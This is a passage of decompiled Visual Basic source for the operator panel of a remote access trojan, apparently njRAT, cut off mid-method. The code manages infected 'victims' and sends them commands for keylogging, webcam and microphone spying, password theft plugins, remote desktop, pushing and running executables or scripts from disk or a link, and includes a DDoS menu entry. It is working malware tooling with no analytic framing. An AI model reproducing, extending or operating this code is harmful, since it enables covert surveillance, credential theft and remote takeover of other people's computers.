		' (set) Token: 0x060001B1 RID: 433 RVA: 0x00156F38 File Offset: 0x00155338
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A6 RID: 166
		' (get) Token: 0x060001B2 RID: 434 RVA: 0x00156F98 File Offset: 0x00155398
		' (set) Token: 0x060001B3 RID: 435 RVA: 0x00156FB0 File Offset: 0x001553B0
		Friend Overridable Property OpenSitesToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenSitesToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenSitesToolStripMenuItem_Click
				Dim flag As Boolean = Me._OpenSitesToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._OpenSitesToolStripMenuItem.Click, value2
				End If
				Me._OpenSitesToolStripMenuItem = value
				flag = (Me._OpenSitesToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._OpenSitesToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A7 RID: 167
		' (get) Token: 0x060001B4 RID: 436 RVA: 0x00157010 File Offset: 0x00155410
		' (set) Token: 0x060001B5 RID: 437 RVA: 0x00157028 File Offset: 0x00155428
		Friend Overridable Property DDoSToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._DDoSToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.DDoSToolStripMenuItem_Click
				Dim flag As Boolean = Me._DDoSToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._DDoSToolStripMenuItem.Click, value2
				End If
				Me._DDoSToolStripMenuItem = value
				flag = (Me._DDoSToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._DDoSToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A8 RID: 168
		' (get) Token: 0x060001B6 RID: 438 RVA: 0x00157088 File Offset: 0x00155488
		' (set) Token: 0x060001B7 RID: 439 RVA: 0x001570A0 File Offset: 0x001554A0
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000A9 RID: 169
		' (get) Token: 0x060001B8 RID: 440 RVA: 0x00157100 File Offset: 0x00155500
		' (set) Token: 0x060001B9 RID: 441 RVA: 0x00157118 File Offset: 0x00155518
		Friend Overridable Property Plugin1ToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._Plugin1ToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.Plugin1ToolStripMenuItem_Click
				Dim flag As Boolean = Me._Plugin1ToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._Plugin1ToolStripMenuItem.Click, value2
				End If
				Me._Plugin1ToolStripMenuItem = value
				flag = (Me._Plugin1ToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._Plugin1ToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AA RID: 170
		' (get) Token: 0x060001BA RID: 442 RVA: 0x00157178 File Offset: 0x00155578
		' (set) Token: 0x060001BB RID: 443 RVA: 0x00157190 File Offset: 0x00155590
		Friend Overridable Property Plugin2ToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._Plugin2ToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.Plugin2ToolStripMenuItem_Click
				Dim flag As Boolean = Me._Plugin2ToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._Plugin2ToolStripMenuItem.Click, value2
				End If
				Me._Plugin2ToolStripMenuItem = value
				flag = (Me._Plugin2ToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._Plugin2ToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AB RID: 171
		' (get) Token: 0x060001BC RID: 444 RVA: 0x001571F0 File Offset: 0x001555F0
		' (set) Token: 0x060001BD RID: 445 RVA: 0x00157208 File Offset: 0x00155608
		Friend Overridable Property ContextMenuStrip2 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip2 = value
			End Set
		End Property

		' Token: 0x170000AC RID: 172
		' (get) Token: 0x060001BE RID: 446 RVA: 0x00157214 File Offset: 0x00155614
		' (set) Token: 0x060001BF RID: 447 RVA: 0x0015722C File Offset: 0x0015562C
		Friend Overridable Property SdfghToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SdfghToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SdfghToolStripMenuItem_Click
				Dim flag As Boolean = Me._SdfghToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._SdfghToolStripMenuItem.Click, value2
				End If
				Me._SdfghToolStripMenuItem = value
				flag = (Me._SdfghToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._SdfghToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000AD RID: 173
		' (get) Token: 0x060001C0 RID: 448 RVA: 0x0015728C File Offset: 0x0015568C
		' (set) Token: 0x060001C1 RID: 449 RVA: 0x001572A4 File Offset: 0x001556A4
		Friend Overridable Property ToolStripSeparator1 As ToolStripSeparator
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripSeparator1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripSeparator)
				Me._ToolStripSeparator1 = value
			End Set
		End Property

		' Token: 0x170000AE RID: 174
		' (get) Token: 0x060001C2 RID: 450 RVA: 0x001572B0 File Offset: 0x001556B0
		' (set) Token: 0x060001C3 RID: 451 RVA: 0x001572C8 File Offset: 0x001556C8
		Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ExitToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExitToolStripMenuItem_Click_1
				Dim flag As Boolean = Me._ExitToolStripMenuItem IsNot Nothing
				If flag Then
					RemoveHandler Me._ExitToolStripMenuItem.Click, value2
				End If
				Me._ExitToolStripMenuItem = value
				flag = (Me._ExitToolStripMenuItem IsNot Nothing)
				If flag Then
					AddHandler Me._ExitToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060001C4 RID: 452 RVA: 0x00157328 File Offset: 0x00155728
		Public Sub New()
			AddHandler MyBase.Activated, AddressOf Me.Form1_Activated
			AddHandler MyBase.Deactivate, AddressOf Me.Form1_Deactivate
			AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Form1.__ENCAddToList(Me)
			Me.Yy = Class7.string_1
			Me.isActive = False
			Me.int_0 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060001C5 RID: 453 RVA: 0x001573B8 File Offset: 0x001557B8
		Public Sub dsk()
			While True
				Dim num As Integer
				Select Case Class7.class8_0.int_2
					Case 0
						num = 10
					Case 1
						num = 2000
					Case 2
						num = 5000
					Case 3
						num = 7500
					Case Else
						num = 10000
				End Select
				Dim flag As Boolean = Me.isActive And CULng(GClass7.smethod_0()) < 12000UL And Me.L1.Columns(0).Width <> 0
				If flag Then
					For Each dataGridViewRow As DataGridViewRow In Me.L1.method_3()
						Dim flag2 As Boolean = dataGridViewRow IsNot Nothing
						If flag2 Then
							Dim client As Client = CType(dataGridViewRow.Tag, Client)
							flag2 = (client IsNot Nothing)
							If flag2 Then
								Dim flag3 As Boolean = False
								flag2 = (DateTime.Compare(client.lastPC, DateTime.MinValue) = 0)
								If flag2 Then
									flag3 = True
								Else
									flag2 = (DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= CDbl(num))
									If flag2 Then
										flag3 = True
									End If
								End If
								flag2 = (Not client.Isend AndAlso flag3)
								If flag2 Then
									client.Isend = True
									client.lastPC = DateAndTime.Now
									client.Send(String.Concat(New String() { "CAP", Class7.string_1, Conversions.ToString(Me.L1.Columns(0).Width), Class7.string_1, Conversions.ToString(Me.L1.method_6()) }))
								End If
							End If
						End If
					Next
				End If
				Thread.Sleep(CInt(Math.Round(Math.Round(CDbl(num) / 2.0))))
			End While
		End Sub

		' Token: 0x060001C6 RID: 454 RVA: 0x001575CC File Offset: 0x001559CC
		Private Sub Form1_Activated(sender As Object, e As EventArgs)
			Me.isActive = True
			Me.Opacity = 1.0
		End Sub

		' Token: 0x060001C7 RID: 455 RVA: 0x001575E8 File Offset: 0x001559E8
		Private Sub Form1_Deactivate(sender As Object, e As EventArgs)
			Me.isActive = False
			Me.Opacity = 0.95
		End Sub

		' Token: 0x060001C8 RID: 456 RVA: 0x00157604 File Offset: 0x00155A04
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.NotifyIcon1.Visible = False
			Try
				Class7.waveOut_0.Dispose()
			Catch ex As Exception
			End Try
			Class7.class8_0.method_1()
			ProjectData.EndApp()
		End Sub

		' Token: 0x060001C9 RID: 457 RVA: 0x00157660 File Offset: 0x00155A60
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Try
				Me.Left = 0 - Me.Width + Screen.PrimaryScreen.WorkingArea.Width
				Me.Top = 0 - Me.Height + Screen.PrimaryScreen.WorkingArea.Height
				Me.L1.method_11("Screen", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None)
				Me.L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("User", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Operating System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Ver", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.Columns(0).Width = 35
				Me.Show()
				Class7.notf_0.Show()
				Control.CheckForIllegalCrossThreadCalls = False
				Class7.form1_0 = Me
				Me.Text = Class7.string_0
				Me.NotifyIcon1.Text = Class7.string_0
				Me.NotifyIcon1.Icon = Me.Icon
				Me.ShowInTaskbar = True
				Me.Pp1.T.Enabled = True
				For Each fileName As String In Directory.GetFiles(Application.StartupPath + "\plugin\", "*.dll")
					Dim item As Class7.Class9 = New Class7.Class9(New FileInfo(fileName).Name.ToLower())
					Class7.list_1.Add(item)
				Next
				For Each text As String In Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary)
					Dim flag As Boolean = Class7.smethod_0(text, Nothing) Is Nothing
					If flag Then
						Interaction.MsgBox("Missing dll >> " + text, MsgBoxStyle.OkOnly, Nothing)
						Dim left As String = Strings.Split(text, ".", -1, CompareMethod.Binary)(0)
						flag = (Operators.CompareString(left, "cam", False) = 0)
						If flag Then
							Me.RemoteCamToolStripMenuItem.Enabled = False
						Else
							flag = (Operators.CompareString(left, "ch", False) = 0)
							If flag Then
								Me.OpenChatToolStripMenuItem.Enabled = False
							Else
								flag = (Operators.CompareString(left, "plg", False) = 0)
								If flag Then
									Me.ManagerToolStripMenuItem.Enabled = False
								Else
									flag = (Operators.CompareString(left, "pw", False) = 0)
									If flag Then
										Me.GetPasswordsToolStripMenuItem.Enabled = False
									Else
										flag = (Operators.CompareString(left, "sc2", False) = 0)
										If flag Then
											Me.RemoteDesktopToolStripMenuItem.Enabled = False
										Else
											flag = (Operators.CompareString(left, "mic", False) = 0)
											If flag Then
												Me.MicrophoneToolStripMenuItem.Enabled = False
											End If
										End If
									End If
								End If
							End If
						End If
					End If
				Next
				Try
					Class7.waveOut_0 = New WaveOut(0)
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono)
					Class7.waveOut_1 = New WaveOut(0)
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono)
				Catch ex As Exception
					Me.MicrophoneToolStripMenuItem.Enabled = False
				End Try
				Class7.class8_0.method_0()
				While True
					Try
						Dim port As port = New port()
						port.TextBox1.Text = Class6.smethod_2("port", "5552")
						port.ShowDialog(Me)
						Dim flag As Boolean = port.port < 1
						If flag Then
							Me.Close()
							Return
						End If
						Me.port = port.port
						Me.S = New SK(Me.port)
						Class6.smethod_3("port", Conversions.ToString(Me.port))
					Catch ex2 As Exception
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, Nothing)
						Continue For
					End Try
					Exit For
				End While
				Class7.sk_0 = Me.S
				Dim thread As Thread = AddressOf Me.dsk
				thread.Start()
				Me.Timer1.Enabled = True
			Catch ex3 As Exception
			End Try
		End Sub

		' Token: 0x060001CA RID: 458 RVA: 0x00157BA8 File Offset: 0x00155FA8
		Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Me.ToolStripStatusLabel1.Tag), "2", False)
			If flag Then
				Me.ToolStripStatusLabel1.Text = "[ Logs ]"
				Me.ToolStripStatusLabel1.Tag = "1"
				Me.L1.BringToFront()
			Else
				Me.ToolStripStatusLabel1.Text = "[ Users ]"
				Me.ToolStripStatusLabel1.Tag = "2"
				Me.Pp1.BringToFront()
			End If
		End Sub

		' Token: 0x060001CB RID: 459 RVA: 0x00157C38 File Offset: 0x00156038
		Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Try
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "CN", New Object() { False }, Nothing, Nothing, False, True)
					Catch ex As Exception
					End Try
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001CC RID: 460 RVA: 0x00157D10 File Offset: 0x00156110
		Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("cam.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001CD RID: 461 RVA: 0x00157DB4 File Offset: 0x001561B4
		Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "kl" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001CE RID: 462 RVA: 0x00157E4C File Offset: 0x0015624C
		Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs)
			MyProject.Forms.About.ShowDialog()
		End Sub

		' Token: 0x060001CF RID: 463 RVA: 0x00157E60 File Offset: 0x00156260
		Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("ch.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001D0 RID: 464 RVA: 0x00157F04 File Offset: 0x00156304
		Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				If flag Then
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				End If
				Dim array As Object() = New Object(0) {}
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag)
				array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				Dim array2 As Object() = array
				Dim array3 As Boolean() = New Boolean() { True }
				NewLateBinding.LateCall(Nothing, GetType(Process), "Start", array2, Nothing, Nothing, array3, True)
				flag = array3(0)
				If flag Then
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2(0)))) }, Nothing, Nothing, True, True)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001D1 RID: 465 RVA: 0x00158088 File Offset: 0x00156488
		Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				flag = (openFileDialog.ShowDialog() = DialogResult.OK)
				If flag Then
					Dim flag2 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag2)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001D2 RID: 466 RVA: 0x00158198 File Offset: 0x00156598
		Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				flag = (openFileDialog.ShowDialog() = DialogResult.OK)
				If flag Then
					Dim flag2 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag2)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "up" + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001D3 RID: 467 RVA: 0x0015829C File Offset: 0x0015669C
		Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim script As script = New script()
				script.ShowDialog(Me)
				flag = (script.Code.Length > 0)
				If flag Then
					Dim flag2 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(Class6.smethod_11(script.Code), flag2)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim memoryStream2 As MemoryStream = memoryStream
					Dim text As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					Dim buffer As Byte() = Class6.smethod_11(text)
					Dim offset As Integer = 0
					Dim text2 As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					memoryStream2.Write(buffer, offset, Class6.smethod_11(text2).Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001D4 RID: 468 RVA: 0x001583B8 File Offset: 0x001567B8
		Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "~"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x060001D5 RID: 469 RVA: 0x00158424 File Offset: 0x00156824
		Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("mic.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001D6 RID: 470 RVA: 0x001584C8 File Offset: 0x001568C8
		Private Sub ToolStripStatusLabel5_Click(sender As Object, e As EventArgs)
			Dim stng As STNG = New STNG() With { .StartPosition = FormStartPosition.CenterScreen }
			stng.ShowDialog()
		End Sub

		' Token: 0x060001D7 RID: 471 RVA: 0x001584F0 File Offset: 0x001568F0
		Private Sub ManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Dim client As Client = CType(dataGridViewRow.Tag, Client)
					Dim flag As Boolean = client IsNot Nothing
					If flag Then
						Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						flag = (manager Is Nothing)
						If flag Then
							manager = New Manager() With { .sk = client, .Name = "m" + client.ip() }
							manager.Show()
						Else
							manager.WindowState = FormWindowState.Minimized
							manager.WindowState = FormWindowState.Normal
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001D8 RID: 472 RVA: 0x001585E8 File Offset: 0x001569E8
		Private Sub L1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs)
			Dim flag As Boolean = e.Column.Index = 0
			If flag Then
				Dim flag2 As Boolean = e.Column.Width > 250
				If flag2 Then
					e.Column.Width = 250
				End If
				flag2 = (e.Column.Width < 35)
				If flag2 Then
					e.Column.Width = 35
				End If
				Me.L1.method_7(CInt(Math.Round(Math.Round(CDbl(e.Column.Width) * 0.67))))
			End If
		End Sub

		' Token: 0x060001D9 RID: 473 RVA: 0x00158684 File Offset: 0x00156A84
		Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001DA RID: 474 RVA: 0x001586C4 File Offset: 0x00156AC4
		Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "@"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x060001DB RID: 475 RVA: 0x00158730 File Offset: 0x00156B30
		Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "!"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x060001DC RID: 476 RVA: 0x0015879C File Offset: 0x00156B9C
		Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				flag = (openFileDialog.ShowDialog() = DialogResult.OK)
				If flag Then
					Dim flag2 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag2)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001DD RID: 477 RVA: 0x001588AC File Offset: 0x00156CAC
		Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim furl As FURL = New FURL()
				furl.ShowDialog(Me)
				flag = furl.IsOK
				If flag Then
					Dim text As String = String.Concat(New String() { "rn", Class7.string_1, furl.TextBox2.Text, Class7.string_1, furl.TextBox1.Text })
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { Class6.smethod_11(text), Color.Green })
				End If
			End If
		End Sub

		' Token: 0x060001DE RID: 478 RVA: 0x00158980 File Offset: 0x00156D80
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
			Dim flag As Boolean = text.Length > 0
			If flag Then
				Try
